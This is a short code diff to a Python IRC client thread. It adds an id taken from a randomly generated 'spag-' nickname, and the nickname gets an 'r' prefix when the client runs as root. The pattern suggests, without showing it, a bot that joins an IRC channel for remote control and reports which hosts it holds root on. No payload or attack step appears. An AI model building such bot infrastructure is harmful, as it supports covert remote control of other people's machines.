@@ -333,6 +333,7 @@ class IRC(threading.Thread):
     def run(self):
         self.nickname = 'spag-' + random_str(5)
         if check_root() : self.nickname = 'r' + self.nickname
+        self.id = self.nickname[-5:]
         self.connect()
 
     def action(self, chan, msg):
